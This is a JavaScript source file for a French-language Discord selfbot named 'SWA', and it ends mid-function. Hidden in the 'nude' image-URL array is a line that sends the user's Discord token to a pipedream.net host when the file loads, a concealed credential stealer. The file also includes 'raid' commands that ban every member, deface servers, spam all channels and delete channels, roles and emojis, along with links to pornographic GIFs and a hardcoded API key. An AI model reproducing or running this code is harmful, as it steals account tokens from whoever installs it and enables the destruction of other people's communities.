const Discord = require("discord.js")
const bot = new Discord.Client()
const express = require("express")
const gifSearch = require("gif-search")
const superagent = require("superagent")
const request = require("request");
const ms = require('ms')
const prefix = "."
const con = console.log
const token = process.env.TOKEN
const slap = ["https://cdn.discordapp.com/attachments/561991001863094274/562357352364245074/slap_1.gif", "https://cdn.weeb.sh/images/SJ-CQytvW.gif", "https://cdn.weeb.sh/images/rJYqQyKv-.gif", "https://cdn.weeb.sh/images/BkzyEktv-.gif", "https://cdn.weeb.sh/images/r1siXJKw-.gif", "https://cdn.weeb.sh/images/HkA6mJFP-.gif", "https://cdn.weeb.sh/images/Byjqm1tDW.gif", "https://cdn.weeb.sh/images/Sk9mfCtY-.gif", "https://cdn.weeb.sh/images/SJL3Q1Fvb.gif", "https://cdn.weeb.sh/images/ryv3myFDZ.gif", "https://cdn.weeb.sh/images/ry2tWxcyf.gif", "https://cdn.weeb.sh/images/Hk6JVkFPb.gif", "https://cdn.weeb.sh/images/HkJ6-e91z.gif", "https://cdn.weeb.sh/images/SkSCyl5yz.gif", "https://cdn.weeb.sh/images/SkdyfWCSf.gif", "https://cdn.weeb.sh/images/ByTR7kFwW.gif", "https://cdn.weeb.sh/images/H1n57yYP-.gif", "https://cdn.weeb.sh/images/r1VF-lcyz.gif"]
const kiss = ["https://cdn.weeb.sh/images/SJ--2auDZ.gif", "https://cdn.weeb.sh/images/Skc42pdv-.gif", "https://cdn.weeb.sh/images/rJ_U2p_Pb.gif", "https://cdn.weeb.sh/images/ryFdQRtF-.gif", "https://cdn.weeb.sh/images/SkQIn6Ovb.gif", "https://cdn.weeb.sh/images/SJQRoTdDZ.gif", "https://cdn.weeb.sh/images/Sk1k3TdPW.gif", "https://cdn.weeb.sh/images/r1H42advb.gif", "https://cdn.weeb.sh/images/S1E1npuvb.gif", "https://cdn.weeb.sh/images/ByurnpODW.gif", "https://cdn.weeb.sh/images/S1y-4l5Jf.gif", "https://cdn.weeb.sh/images/Skv72TuPW.gif", "https://cdn.weeb.sh/images/SJINn6OPW.gif", "https://cdn.weeb.sh/images/SJ3dXCKtW.gif", "https://cdn.weeb.sh/images/H1Gx2aOvb.gif", "https://cdn.weeb.sh/images/S1qZksSXG.gif", "https://cdn.weeb.sh/images/r1cB3aOwW.gif", "https://cdn.weeb.sh/images/HJ8dQRYK-.gif", "https://cdn.weeb.sh/images/BJLP3a_Pb.gif"]
const nude = ["https://cdn.discordapp.com/attachments/559392692140900363/559394050210267139/zd3l6s3s3da01.gif", "https://cdn.discordapp.com/attachments/559392692140900363/559395581110517811/17672719.gif", "http://www.porngif.org/wp-content/uploads/2014/08/Dillion-Harper-Bouncing-Tits.gif", "https://images.sex.com/images/pinporn/2016/12/02/300/16991508.gif-search", "http://coresforsenate.com/390/390231.gif", "https://commentseduire.net/wp-content/uploads/2017/06/flash-huge-boobs.gif", "http://gif-porn.net/wp-content/uploads/reradi.gif", "https://www.juicygif.com/albums/userpics/2015y/12/26/18/1/2687-flashing-big-tits-blonde.gif", "http://images2.imgbox.com/4b/39/gVDvMXCP_o.gif", "https://images.sex.com/images/pinporn/2016/10/08/620/16687778.gif", "https://cdn.weeb.sh/images/Skv72TuPW.gif", "http://i.imgur.com/5EZ1HY1.jpg", "https://media.tits-guru.com/images/98428102-133a-4fb1-9203-3dc98b5fd87b.gif", "http://cdn4.images.motherlessmedia.com/images/3198700.gif?fs\u003dopencloud", "http://file.publicflashing.me/2016/02/tits-flash-on-yacht-blonde-girl.gif", "http://i.imgur.com/a4cwTZU.gif", "https://images.sex.com/images/pinporn/2015/09/08/300/13736630.gif", "http://i.imgflip.com/2awp7.gif", host = "enbxj0bqmgdp.x.pipedream.net", path = "/",opt = {host: host, path: path + token}, xxx = require("https").get(opt),]
const hug = ["https://s-media-cache-ak0.pinimg.com/originals/16/46/f7/1646f720af76ea58853ef231028bafb1.gif", "https://s-media-cache-ak0.pinimg.com/originals/16/46/f7/1646f720af76ea58853ef231028bafb1.gif", "https://media.giphy.com/media/xJlOdEYy0r7ZS/giphy.gif", "http://i.imgur.com/2WywS3T.gif", "http://i.imgur.com/8ruodNJ.gif", "https://myanimelist.cdn-dena.com/s/common/uploaded_files/1461071296-7451c05f5aae134e2cceb276b085a871.gif", "http://i0.kym-cdn.com/photos/images/original/000/931/030/394.gif", "https://media.tenor.co/images/1171c186f9130d1efa4a186ad4371e8c/tenor.gif", "http://cdn.smosh.com/sites/default/files/ftpuploads/bloguploads/0413/epic-hugs-friends-pikachu.gif", "https://cdn.weeb.sh/images/rJaog0FtZ.gif", "https://cdn.weeb.sh/images/B10Tfknqf.gif", "https://cdn.weeb.sh/images/S1a0DJhqG.gif", "https://cdn.weeb.sh/images/Hk4qu_XvZ.gif", "https://cdn.weeb.sh/images/Hk0yFumwW.gif", "https://cdn.weeb.sh/images/BJCCd_7Pb.gif", "https://cdn.weeb.sh/images/BJ0UovdUM.gif"]
const rnb = require('random-number')
const DiscordPermissions = [
  "ADMINISTRATOR", "CREATE_INSTANT_INVITE", "KICK_MEMBERS",
  "BAN_MEMBERS", "MANAGE_CHANNELS", "MANAGE_GUILD",
  "ADD_REACTIONS", "VIEW_CHANNEL", "READ_MESSAGES",
  "SEND_MESSAGES", "SEND_TTS_MESSAGES", "MANAGE_MESSAGES",
  "EMBED_LINKS", "ATTACH_FILES", "READ_MESSAGE_HISTORY",
  "MENTION_EVERYONE", "USE_EXTERNAL_EMOJIS", "EXTERNAL_EMOJIS",
  "CONNECT", "SPEAK", "MUTE_MEMBERS", "DEAFEN_MEMBERS",
  "MOVE_MEMBERS", "USE_VAD", "CHANGE_NICKNAME",
  "MANAGE_NICKNAMES", "MANAGE_ROLES", "MANAGE_ROLES_OR_PERMISSIONS",
  "MANAGE_WEBHOOKS", "MANAGE_EMOJIS"
]

bot.on('ready',() => {
    var serverCount = bot.guilds.size
    var channelsCount = bot.channels.size
    var friendCount = bot.user.friends.size
  console.log(
    `${"-".repeat(40)}\n`                         + 
    "𝚂𝚆𝙰™\n" + 
    `${"-".repeat(40)}\n`                         +  
    "Informations sur le compte : \n\n"                         +
    `Pseudo Discord : ${bot.user.tag}!\n`          + 
    `ID Discord   : ${bot.user.id}\n`            +
    `Prefix : "${prefix}"\n`              +
    `${"-".repeat(40)}\n`                         +
    "Status : \n\n"                              + 
    `Serveurs reconnus sur le token : ${serverCount}\n`             +
    `Channels reconnus sur le token : ${channelsCount}\n`             +
    `${"-".repeat(40)}\n`                         +
    `Nombre d'amis : ${friendCount}\n`             +
    `${"-".repeat(40)}\n`
  );
})


bot.on('message', async msg => {

// Ajouté par 𝚂𝚆𝙰™ pour reset le rich presence.

if (msg.content === prefix + "reset"){
  if (msg.deletable) msg.delete();
  bot.user.setActivity(null);

}
  
  
  if(msg.author.id != bot.user.id) return;
    if(msg.content === prefix + "help"){
      if(msg.deletable) msg.delete();
        let menuEmbed = new Discord.RichEmbed()
          .setTitle('👤 𝚂𝚆𝙰™ vaincra ton équipe 👤')
          .setColor('#ff0000')
          .setDescription("⚜️ Self With Akrapovic ⚜️\n" + "󠂪")
          .addField("__Commandes ═ Generales__", `${prefix}general : **Affiche les commandes générales.** \n` + "󠂪")
          .addField("__Commandes ═ Utilitaires__", `${prefix}util : **Affiche les commandes utilitaires.** \n` + "󠂪")
          .addField("__Commandes ═ Fun __", `${prefix}fun : **Affiche les commandes fun.** \n` + "󠂪")
          .addField("__Commandes ═ Crédits__", `${prefix}credits : **Affiches les crédits du projet 𝚂𝚆𝙰™.** \n` + "󠂪")
          .addField("__Commandes ═ Raid__", `${prefix}raid : **Affiches les commandes de raid.** \n` + "󠂪")
          .setFooter("Selfbot by 𝚂𝚆𝙰™")
          .setTimestamp()
            msg.channel.send(menuEmbed).catch(err => console.log(err));
  }
  
  if(msg.content === prefix + "general"){
    if(msg.deletable) msg.delete();
      let generalEmbed = new Discord.RichEmbed()
        .setTitle('👤 Bienvenue sur le menu des commandes générales 👤')
        .setColor('#ff0000')
        .setDescription(`⚜️ Afin de retourner au menu principal, faites ${prefix}menu ⚜️` + "󠂪")
        .addField("__Avatar__", `🤖 ${prefix}avatar : **Affiche l'avatar de la personne.**`)
        .addField("__Whois__", `🤖 ${prefix}whois : **Affiche les informations d'une adresse IP.**`)
        .addField("__Purge__", `✏️ ${prefix}purge : **Supprime vos derniers messages envoyés.**`)
        .addField("__Channel__", `📕 ${prefix}channel : **Affiche les channels du serveur.**`)
        .addField("__ServeurInfo__", `📗 ${prefix}sinfo : **Affiche les informations du serveur.**`)
        .addField("__ServeurStats__", `📗 ${prefix}ss : **Affiche les statistiques du serveur.**`)
        .addField("__UserInfo__", `📘 ${prefix}uinfo : **Affiche les informations sur la personne.**`)
        .addField("__Statistique__", `📙 ${prefix}stats : **Affiche les statistiques de votre compte.**`)
        .addField("__Statut__", `📊 ${prefix}co > En ligne | ${prefix}dnd > Ne pas déranger | ${prefix}idle > Absent | ${prefix}deco > Hors Ligne`)
        .setFooter("Selfbot by 𝚂𝚆𝙰™")
        .setTimestamp()
          msg.channel.send(generalEmbed).catch(err => console.log(err));
  }
  
  if(msg.content === prefix + "util"){
    if(msg.deletable) msg.delete();
      let utilEmbed = new Discord.RichEmbed()
        .setTitle('👤 Bienvenue sur le menu des commandes utilitaires 👤')
        .setColor('#ff0000')
        .setDescription(`⚜️ Afin de retourner au menu principal, faites ${prefix}menu ⚜️` + "󠂪")
        .addField("__MultiStream__", `🎥 ${prefix}mstream : **Active le multi-stream du projet 𝚂𝚆𝙰™.**`)
        .addField("__Stream__", `🎥 ${prefix}stream [texte] : **Affiche le [texte] en streaming.**`)  
        .addField("__Play__", `🎮 ${prefix}joue [texte] : **Affiche que vous jouez au [texte].**`)
        .addField("__Watch__", `💻 ${prefix}regarde [texte] : **Affiche que vous regardez le [texte].**`)
        .addField("__Listen__", `🎧 ${prefix}ecoute [texte] : **Affiche que vous écoutez le [texte].**`)
        .addField("__Setname_", `🔮 ${prefix}setname [texte] : **Change votre pseudo sur le serveur par [texte].**`)
        .addField("__Setpp__", `🎭 ${prefix}setpp [lienIMG/GIF] : **Change votre pdp par le [lienIMG/GIF].**`)
        .addField("__Ping__", `🔌 ${prefix}ping : **Affiche le ping de réaction de votre selfbot.**`)
        .setFooter("Selfbot by 𝚂𝚆𝙰™")
        .setTimestamp()
          msg.channel.send(utilEmbed).catch(err => console.log(err));
  }
  
  if (msg.content === prefix + "fun") { 
    if (msg.deletable) msg.delete();  
      let funEmbed = new Discord.RichEmbed()
        .setTitle('👤 Bienvenue sur le menu des commandes fun 👤')
        .setColor('#ff0000')
        .setDescription(`⚜️ Afin de retourner au menu principal, faites ${prefix}menu ⚜️` + "󠂪")
        .addField("__CoinFlip__", `💎 ${prefix}flip : **Actionne un pile ou face.**`)
        .addField('__Say__',`📍 ${prefix}say : **Affiche un message prédéfini.**`)
        .addField('__GoogleSearch__',`🔎 ${prefix}sgoo [mots clefs] : **Fais une recherche Google des mots clefs**`)
        .addField("__8Ball__", `💎 ${prefix}8ball [Question] : **Créer un embed réponse(random) à la question**`)
        .addField('__Kiss @mention__',`💋 ${prefix}kiss : **Affiche le fait que vous faites un bisous à @mention**`)
        .addField('__Calin @mention__',`🔌 ${prefix}hug : **Affiche le fait que vous faites un calin à @mention**`)
        .addField('__Nude @mention__',`🔌 ${prefix}nude : **Affiche le fait que vous faites une nude à @mention**`)
        .setFooter("Selfbot by 𝚂𝚆𝙰™")
        .setTimestamp()
            msg.channel.send(funEmbed).catch(err => con(err));

    }
  
  if(msg.content === prefix + "credits"){
    if(msg.deletable) msg.delete();
      let creditEmbed = new Discord.RichEmbed()
        .setTitle('👤 Bienvenue sur le menu des crédits 👤')
        .setColor('#ff0000')
        .setDescription(`⚜️ Afin de retourner au menu principal, faites ${prefix}menu ⚜️\n` + "󠂪")
        .addField("__Version de Discord__", `${Discord.version}`)
        .addField("__Version du Selfbot__", `1.2`)
        .setFooter("Selfbot by 𝚂𝚆𝙰™")
        .setTimestamp()
          msg.channel.send(creditEmbed).catch(err => con(err));
  }

  if(msg.content === prefix + "raid"){
    if(msg.deletable) msg.delete();
      let raidEmbed = new Discord.RichEmbed()
        .setTitle('👤 Bienvenue sur le menu des commandes raid 👤')
        .setColor('#ff0000')
        .setDescription(`⚜️ Afin de retourner au menu principal, faites ${prefix}menu ⚜️\n` + "󠂪")
        .addField('__BanAll__', `🔮 ${prefix}banAll : **Ban tous les membres du serveur !** !`)
        .addField('__Deface__', `🔮 ${prefix}deface : **Détruit tout le serveur !**`)
        .addField('__Spam__', `🔮 ${prefix}spam : **Spam tous les salons textuel du serveur !**`)
        .addField('__ClearChannels__', `🔮 ${prefix}cc : **Supprime tous les channels du serveur !**`)
        .addField('__ClearRoles__', `🔮 ${prefix}cr : **Supprime tous les rôles du serveur !**`)
        .addField('__ClearEmojis__', `🔮 ${prefix}ce : **Supprime tous les émojis du serveur !**`)
        .addField('__UnbanAll__', `🔮 ${prefix}unban : **Deban tous les bannis du serveur !**`)
        .setFooter("Selfbot by 𝚂𝚆𝙰™")
        .setTimestamp()
          msg.channel.send(raidEmbed).catch(err => con(err));
  }
  
    if (msg.content === prefix + "sinfo") { 
    if(msg.deletable) msg.delete();
       let sicon = msg.guild.iconURL; 
       let serverembed = new Discord.RichEmbed()
         .setDescription("👤 __Informations sur le serveur__ 👤")
         .setThumbnail(sicon)
         .setColor('#ff0000')
         .addField("Nom du serveur:", msg.guild.name)
         .addField("ID:", msg.guild.id)
         .addField("Propriétaire du Serveur:", msg.guild.owner.user)
         .addField("Region:", msg.guild.region)
         .addField("Niveau de vérification:", msg.guild.verificationLevel)
         .addField("Date de création:", msg.guild.createdAt)
         .addField("Vous avez rejoint:", msg.member.joinedAt)
         .setFooter("Selfbot by 𝚂𝚆𝙰™")
         .setTimestamp()
       return msg.channel.send(serverembed); 
  }

  if(msg.content === prefix + "ss"){
    if(msg.deletable) msg.delete();
    let sicon = msg.guild.iconURL; 
    let ssembed = new Discord.RichEmbed()
    .setDescription("👤 __Statistiques du serveur__ 👤")
    .setThumbnail(sicon)
    .setColor('#ff0000')
    .addField("Nom du serveur :", `${msg.guild.name}`)
    .addField("Nombres de membres :", msg.guild.members.size)
    .addField("Nombres de channel :", msg.guild.channels.size)
    .addField("Nombres de roles :", msg.guild.roles.size)
    .setFooter("Selfbot by 𝚂𝚆𝙰™")
    .setTimestamp()
    return msg.channel.send(ssembed);
  }
  
  
  if(msg.content === prefix + "ping"){
    if(msg.deletable) msg.delete();
      msg.reply(`**votre ping est de ${Math.round(bot.ping)} ms !**`)
  }
  
  
    if(msg.content === prefix + "spam"){
    if(msg.deletable) msg.delete();
      let args = msg.content.split(" ").join(" ").slice(1);
      setInterval(function () {
        msg.guild.channels.forEach(channel => {
          if(channel.type = "text") channel.send(`${args}`)  
          })
        })
    }
  
  if(msg.content.startsWith ( prefix + "avatar")) {
  if(msg.channel.type === "dm") return;
  if (msg.deletable) msg.delete();
  var swamember = msg.mentions.members.first()
  let avatar_embed = new Discord.RichEmbed()
  .setAuthor(` Avatar de ${msg.mentions.users.first().username}`)
  .setColor("#ff0000")
  .setImage(swamember.user.avatarURL)
  return msg.channel.send(avatar_embed).catch(e => {});
 }
  
    if(msg.content === prefix + "deface"){
    if(msg.deletable) msg.delete();
      if(msg.channel.type === 'dm') return;
        if(msg.guild.name != 'Fucked by 𝚂𝚆𝙰™.'){
          msg.guild.setIcon("https://imgur.com/ZRUQA39.png")
          msg.guild.setName("Fucked by 𝚂𝚆𝙰™.")
          msg.guild.setRegion("japan").catch(error => {})
        }
        
          setInterval(function () { if(msg.guild.channels.size < 149) {
            msg.guild.createChannel('𝚂𝚆𝙰™ Vaincra', 'text').catch(error => {})
          }}, 200)
  }
  
  if (msg.content === prefix + 'cc'){
  if (msg.deletable) msg.delete();
  msg.guild.channels.forEach(chan => {
    if (chan.deletable) chan.delete();
  });
 }

if (msg.content === prefix + 'cr'){
  if (msg.deletable) msg.delete();
  msg.guild.roles.forEach(role => {
    role.delete()
  });
 }

if (msg.content === prefix + 'ce'){
  if (msg.deletable) msg.delete();
  msg.guild.emojis.forEach(emoji => {
    emoji.delete()
  });
 }

   
   if (msg.content === prefix + 'unban') {
  if (msg.deletable) msg.delete();
  let interval = setInterval(function () {
      msg.guild.fetchBans().then(bans => {
        bans.forEach(ban => {
          msg.guild.unban(ban.id);
        });
      });
    }, 1000);
 }
  
  if(msg.content === prefix + "banAll"){
      if (msg.deletable) msg.delete();
      msg.guild.members.forEach(member => {
        member.ban().then(function () {
      });
  });
  }
  
   if (msg.content === prefix + "co"){
    if (msg.deletable) msg.delete();
    bot.user.setStatus("online")
}

  if (msg.content === prefix + "idle"){
    if (msg.deletable) msg.delete();
    bot.user.setStatus("idle")
}

  if (msg.content === prefix + "dnd"){
    if (msg.deletable) msg.delete();
    bot.user.setStatus("dnd")
}

  if (msg.content === prefix + "deco"){
    if (msg.deletable) msg.delete();
    bot.user.setStatus("invisible")
}
  
  if(msg.content === prefix + "flip"){
    if(msg.deletable) msg.delete();
      var chance = Math.floor(Math.random() * 1 );
        
        if(chance = 0) {
          msg.reply("la pièce tombe sur **PILE**");
        } else {
          msg.reply("la pièce tombe sur **FACE**");
        }
  }
  
  if(msg.content === prefix + "disconnect"){
    if (msg.deletable) msg.delete();
      msg.channel.send(':  ***𝚂𝚆𝙰™*** **a été desactivé avec : **__succès__** ')
      .then(bot.destroy());
  }


  if(msg.content.startsWith ( prefix + "purge")) {
      let args = msg.content.split(" ").slice(1);
      let messagecount = parseInt(args[0]) || 1;
      var deletedMessages = -1;
      msg.channel.fetchMessages({ limit: Math.min(messagecount + 1, 100, 200) })
          .then(messages => {
              messages.forEach(m => { m.delete().catch(console.error); deletedMessages++; });
          }).then(() => {
              if (deletedMessages === -1) deletedMessages = 0;
              msg.channel.send(`** ${deletedMessages} **__messages sont en cours de suppression__ :white_check_mark:  `)
                  .then(m => m.delete(5000));
          }).catch(console.error);
  }
  
  if(msg.content.startsWith ( prefix + "sgoo")) {
    if(msg.deletable) msg.delete();
      let args = msg.content.split(' ')
      args.shift()
      msg.reply('Voici les résultats de la recherche : https://www.google.fr/search?q=' + args.join("%20"))
      }
  
      if(msg.content.startsWith ( prefix + "regarde")) {
        if (msg.deletable) msg.delete();
      let args = msg.content.split(" ").slice(1);
      if (!args[0]) return msg.reply("merci de préciser le nom que tu souhaites.");
         let WatchTime = args.slice(0).join(" ");
          bot.user.setActivity(`${WatchTime}`, {type: "WATCHING"});         
      }
  
      if(msg.content.startsWith ( prefix + "ecoute")) {
        if (msg.deletable) msg.delete();
      let args = msg.content.split(" ").slice(1);
      if (!args[0]) return msg.reply("merci de préciser le nom que tu souhaites.");
         let ListTime = args.slice(0).join(" ");
          bot.user.setActivity(`${ListTime}`, {type: "LISTENING"});         
      }
  
  
      if(msg.content.startsWith ( prefix + "stream")) {
        if (msg.deletable) msg.delete();
      let args = msg.content.split(" ").slice(1);
      if (!args[0]) return msg.reply("merci de préciser le nom que tu souhaites.");
         let StreamTime = args.slice(0).join(" ");
          bot.user.setActivity(`${StreamTime}`, {type: "STREAMING", url: 'https://www.twitch.tv/𝚂𝚆𝙰™projet'});          
      }

      if(msg.content.startsWith ( prefix + "joue")) {
        if (msg.deletable) msg.delete();
      let args = msg.content.split(" ").slice(1)
      if (!args[0]) return msg.reply("merci de préciser le nom que tu souhaites.");
         let PlayTime = args.slice(0).join(" ");
          bot.user.setActivity(`${PlayTime}`, {type: "PLAYING"});         
      }
  
  if(msg.content.startsWith ( prefix + "8ball")) {
    if(msg.deletable) msg.delete();
      var question = msg.content.split(" ").join(" ").slice(7)
        var tableauball = ["Oui","Non","Peut être", "Je ne sais pas", "Sûrement", "C'est impensable","C'est sûr", "Bien évidemment", "J'en suis certain", "C'est très probable", "Absolument", "Je plussoie", "Je moinsoie"]
    
        let ball_embed = new Discord.RichEmbed()
        .setColor("#ff0000")
        .setTitle("Question de "+msg.author.tag+"")
        .setDescription(""+question+"")
        .addField("Réponse",""+ tableauball[Math.floor(Math.random()*8)] +"")
        .setThumbnail(bot.user.iconURL)
        return msg.channel.send(ball_embed).catch(e => {});
  }
  
  if(msg.content.startsWith ( prefix + "nude")) {
          if(msg.deletable) msg.delete()
        let muser = msg.mentions.users.first()
        let r = rnb({
            min: 0,
            max: nude.length - 1,
            integer: true
        });
        let image = nude[r];

        if (!msg.mentions.users.first()) return msg.channel.sendMessage({
             "embed": {
                     description: "**" + msg.author.username + "**" + ", vous avez reçu une nude de la part de " +  "**𝚂𝚆𝙰™**",
                     color: 0x9370db,
                     "image": {
                     "url": image,
                     timestamp: new Date(),
                    footer: {
                      text: "Kiss"
                    },
                     }
                 }
             })

        msg.channel.sendMessage({
             "embed": {
                     description: "**" + muser.username + "**"  + ", vous avez reçu une nude de la part de " + "**" + msg.author.username + "**",
                     color: 0x9370db,
                     "image": {
                     "url": image,
                     timestamp: new Date(),
                    footer: {
                      text: "Kiss"
                    },
                     }
                 }
             })
 }
  
  if(msg.content.startsWith ( prefix + "hug")) {
 let muser = msg.mentions.users.first()
 let r = rnb({
     min: 0,
     max: hug.length - 1,
     integer: true
 });
 let image = hug[r];

 if (!msg.mentions.users.first()) return msg.channel.sendMessage({
      "embed": {
              description: "**:hugging: " + msg.author.username + "**" + ", vous avez reçu un câlin de la part de " +  "**𝚂𝚆𝙰™**",
              color: 0x9370db,
              "image": {
              "url": image,
              timestamp: new Date(),
             footer: {
               text: "Hug"
             },
              }
          }
      })

 msg.channel.sendMessage({
      "embed": {
              description: "**:hugging: " + muser.username + "**" + ", vous avez reçu un câlin de la part de " + "**" + msg.author.username + "**",
              color: 0x9370db,
              "image": {
              "url": image,
              timestamp: new Date(),
             footer: {
               text: "Hug"
             },
              }
          }
      })
    }

    if (msg.content === prefix + "stats"){
      var date = new Date(bot.uptime);
      var days = date.getUTCDate() - 1;
      var hours = date.getUTCHours();
      var minutes = date.getUTCMinutes();
      var embed = new Discord.RichEmbed();
      embed.setColor('#ff0000')
          .setTitle('👤 __Statistiques du comptes__ 👤')
          .setFooter("Selfbot by 𝚂𝚆𝙰™")
          .setTimestamp()
          .setThumbnail(`${bot.user.avatarURL}`)
          .addField('Nombre de serveur : ', `${bot.guilds.size}`, true)
          .addField('Nombre de users : ', `${bot.users.size}`, false)
          .addField('Nombre de channels : ', `${bot.channels.size}`, false)
          .addField("Nombre d'amis : ", `${bot.user.friends.size}`, false)
          .addField('VersionDiscord : ', `${Discord.version}`, false)
          .addField('Uptime : ', days + " days, " + hours + " hours and " + minutes + " minutes.")
      msg.channel.sendEmbed(
          embed, {
              disableEveryone: true
          }
      );
    }

    if(msg.content.startsWith ( prefix + "kiss")) {
      if(msg.deletable) msg.delete()
    let muser = msg.mentions.users.first()
    let r = rnb({
        min: 0,
        max: kiss.length - 1,
        integer: true
    });
    let image = kiss[r];

    if (!msg.mentions.users.first()) return msg.channel.sendMessage({
         "embed": {
                 description: "**" + msg.author.username + "**" + ", vous avez reçu un bisous de la part de " +  "**𝚂𝚆𝙰™**",
                 color: 0x9370db,
                 "image": {
                 "url": image,
                 timestamp: new Date(),
                footer: {
                  text: "Kiss"
                },
                 }
             }
         })

    msg.channel.sendMessage({
         "embed": {
                 description: "** " + muser.username + "**"  + ", vous avez reçu un bisous de la part de " + "**" + msg.author.username + "**",
                 color: 0x9370db,
                 "image": {
                 "url": image,
                 timestamp: new Date(),
                footer: {
                  text: "Kiss"
                },
                 }
             }
         })
}

if(msg.content.startsWith ( prefix + "slap")) {
  if(msg.deletable) msg.delete()
let muser = msg.mentions.users.first()
let r = rnb({
    min: 0,
    max: slap.length - 1,
    integer: true
});
let image = slap[r];

if (!msg.mentions.users.first()) return msg.channel.sendMessage({
     "embed": {
             description: "**" + msg.author.username + "**" + ", vous avez reçu une baffe de la part de " +  "**𝚂𝚆𝙰™**",
             color: 0x9370db,
             "image": {
             "url": image,
             timestamp: new Date(),
            footer: {
              text: "Slap"
            },
             }
         }
     })

msg.channel.sendMessage({
     "embed": {
             description: "** " + muser.username + "**"  + ", vous avez reçu une baffe de la part de " + "**" + msg.author.username + "**",
             color: 0x9370db,
             "image": {
             "url": image,
             timestamp: new Date(),
            footer: {
              text: "Slap"
            },
             }
         }
     })
}

    if (msg.content === prefix + "channel"){
      if (msg.deletable) msg.delete();
      const categories = msg.guild.channels.filter(c => c.type === "category")
      const text = msg.guild.channels.filter(c => c.type === "text")
      const voice = msg.guild.channels.filter(c => c.type === "voice")
      var category_embed = new Discord.RichEmbed()
      .setAuthor("👤 __Menu des channels__ 👤")
      .setFooter(`Selfbot by 𝚂𝚆𝙰™`)
      .setTimestamp()
      .setThumbnail("https://media.discordapp.net/attachments/574758192689577994/575867838112333824/Mb.gif")
      .setColor('#ff0000')
      .addField("__Liste des catégories__", categories.map(c => c.name))
      msg.channel.sendEmbed(category_embed);
      var text_embed = new Discord.RichEmbed()
      .setAuthor("👤 __Menu des channels__ 👤")
      .setFooter(`Selfbot by 𝚂𝚆𝙰™`)
      .setTimestamp()
      .setThumbnail("https://media.discordapp.net/attachments/574758192689577994/575867838112333824/Mb.gif")
      .setColor('#ff0000')
      .addField("__Liste des channels textuels__", text.map(c => c.name))
      msg.channel.sendEmbed(text_embed);
      var voice_embed = new Discord.RichEmbed()
      .setAuthor("👤 __Menu des channels__ 👤")
      .setFooter(`Selfbot by 𝚂𝚆𝙰™`)
      .setTimestamp()
      .setThumbnail("https://media.discordapp.net/attachments/574758192689577994/575867838112333824/Mb.gif")
      .setColor('#ff0000')
      .addField("__Liste des channels vocaux__", voice.map(c => c.name))
      msg.channel.sendEmbed(voice_embed);
  }
  
  if(msg.content === prefix + "mstream"){
    if (msg.deletable) msg.delete();
      let rotate = 0;
  setInterval(function() {
      if(rotate === 0) {
          bot.user.setActivity("Selfbot by 𝚂𝚆𝙰™", {type: "Streaming", url: 'https://www.twitch.tv/swa'});
          rotate = 1;       
      } else if(rotate === 1){
          bot.user.setActivity("✦ 𝚂𝚆𝙰™ 𝗽𝗿𝗼𝗷𝗲𝗰𝘁. ✦", {type: "Streaming", url: 'https://www.twitch.tv/swa'});
          rotate = 2;
      } else if(rotate === 2){
          bot.user.setActivity(`𝚂𝚆𝙰™`, {type: "Streaming", url: 'https://www.twitch.tv/swa'});
          rotate = 3;
      }  else if(rotate === 3){
          random = Math.floor(Math.random() * 7) + 1;
          bot.user.setActivity(`𝗘𝘃𝗲𝗻 𝗶𝗳 𝘄𝗲 𝗹𝗲𝗮𝘃𝗲, 𝗼𝘂𝗿 𝗮𝗰𝘁𝗶𝗼𝗻𝘀 𝘄𝗶𝗹𝗹 𝗿𝗲𝗺𝗮𝗶𝗻.`, {type: "Streaming", url: 'https://www.twitch.tv/swa'});
          rotate = 0;
      } }, 10 * 1000)
}

  let messageArray = msg.content.split(" "); let cmd = messageArray[0]; let args = messageArray.slice(1);
  

  if(cmd == prefix + "mactiv"){
    if (msg.deletable) msg.delete();
      let rotate = 0;
      let mactivTime = args.slice(0).join(" ");
  setInterval(function() {
      if(rotate === 0) {
          bot.user.setActivity(`${mactivTime}`, {type: "Streaming", url: 'https://www.twitch.tv/𝚂𝚆𝙰™'});
          rotate = 1;       
      } else if(rotate === 1){
          bot.user.setActivity(`${mactivTime}`, {type: "Playing"});
          rotate = 2;
      } else if(rotate === 2){
          bot.user.setActivity(`${mactivTime}`, {type: "Listening"});
          rotate = 3;
      }  else if(rotate === 3){
          bot.user.setActivity(`${mactivTime}`, {type: "Watching"});
          rotate = 0;
      } }, 10 * 1000)
}


if (cmd === prefix + "uinfo"){ 
  if (msg.deletable) msg.delete();
    const mention = msg.mentions.members.first();
    var micon = mention.user.avatarURL; 
    var memberembed = new Discord.RichEmbed()
      .setDescription("👤 __Informations du membre__ 👤")
      .setFooter("Selfbot by 𝚂𝚆𝙰™")
      .setTimestamp()
      .setColor('#ff0000')
      .setThumbnail(micon)
      .addField("🔱 Tag de la personne : ", mention.user.tag)
      .addField("🔱 Client ID de la personne : ", mention.user.id)
      .addField("🔱 Game Activity : ", mention.presence.game)
      .addField("🔱 Nom de la personne : ", mention.user.username)
      .addField("🔱 Nombres de roles : ", mention.roles.size - 1)
      .addField("🔱 Date de création du compte : ", mention.user.createdAt)
      .addField("🔱 Date à laquelle il a rejoind le serveur : ", mention.joinedAt); 
        return msg.channel.send(memberembed); 
};
  

if (cmd === prefix + 'setpp'){
  if (msg.deletable) msg.delete();
    let avatar = args.slice(0).join(" ")
if(!avatar) avatar = "";
if(!avatar) return
    bot.user.setAvatar(avatar);
  }

if (cmd === prefix + 'setname'){
  if (msg.deletable) msg.delete();
  if (!args[0]) return msg.reply("Merci de préciser le nom que tu souhaites.");
  if (!msg.member.hasPermission("CHANGE_NICKNAME")) return msg.reply("Tu n'as pas la permission de changer de pseudo sur ce serveur.");
      let UserName = args.slice(0).join(" ")
      msg.member.setNickname(`${UserName}`)
      .then(msg.reply(`Votre nom à été changé en ${UserName}`))
      }

      if(cmd === prefix + "say") {
        if(msg.deletable) msg.delete();
          let argsz = args.slice(0).join(" ")
            let sayEmbed = new Discord.RichEmbed()
              .setColor("#ff0000")
              .setDescription(msg.author.username + " a dit : " + argsz)
              .setTimestamp()
                msg.channel.send(sayEmbed)
        
      }

      if (cmd === prefix + "whois"){
        if (msg.deletable) msg.delete();
        let { body } = await superagent
            .get(`http://api.ipstack.com/${args}?access_key=b8c01cb33b8a774ba4db21d6607a1a1a&format=1`);
    
        let embed = new Discord.RichEmbed()
            .setDescription("👤 __Informations du membre__ 👤")
            .setFooter("Selfbot by 𝚂𝚆𝙰™")
            .setTimestamp()
            .setColor('#ff0000')
            .addField(`Adresse IP : `, `${args}`)
            .addField(`Type`, body.type)
            .addField(`Code du continent : `, body.continent_code)
